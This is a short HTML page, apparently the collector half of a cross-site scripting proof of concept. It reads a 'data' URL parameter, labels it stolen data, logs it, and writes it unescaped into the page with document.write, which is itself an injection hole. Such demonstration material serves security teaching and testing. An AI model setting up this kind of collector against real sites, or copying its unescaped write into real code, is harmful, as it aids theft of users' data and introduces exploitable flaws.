<h1>XSS Proof-of-Concept Logger</h1>
<p>Check the URL parameters for stolen data.</p>
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const stolenData = urlParams.get('data');
    if (stolenData) {
        document.write('<p>Received: ' + stolenData + '</p>');
        console.log("[+] Stolen Data:", stolenData);
    }
</script>
